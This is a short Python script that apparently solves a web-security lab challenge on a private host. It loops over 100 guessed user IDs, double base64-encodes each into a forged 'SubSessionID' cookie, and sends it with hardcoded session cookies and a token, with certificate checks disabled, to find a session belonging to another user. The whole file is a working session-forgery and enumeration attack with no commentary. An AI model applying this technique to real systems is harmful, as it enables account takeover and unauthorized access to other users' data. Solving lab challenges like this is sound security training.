import base64

import requests

header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': '951A7C8ED5CF4D9328425738A4E9994F',
    'JSESSIONID3': '"FGDITjs+dL2y71uOrRHd2Q=="',
    'current': 'WVdSdGFXND0=',
    'token': '16095187280568629069093631865029247753'
}


for i in range(100):
    user_id = str(i).zfill(16)
    data = {
        'useSecurity': 'true',
        'userId': user_id
    }

    user_id_base = base64.urlsafe_b64encode(base64.urlsafe_b64encode(user_id.encode()))

    cookies['SubSessionID'] = user_id_base.decode()

    response = requests.post('https://172.50.1.5:9443/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6', data=data,
                                headers=header, cookies=cookies, verify=False)
    print(response.text)
    print(user_id)
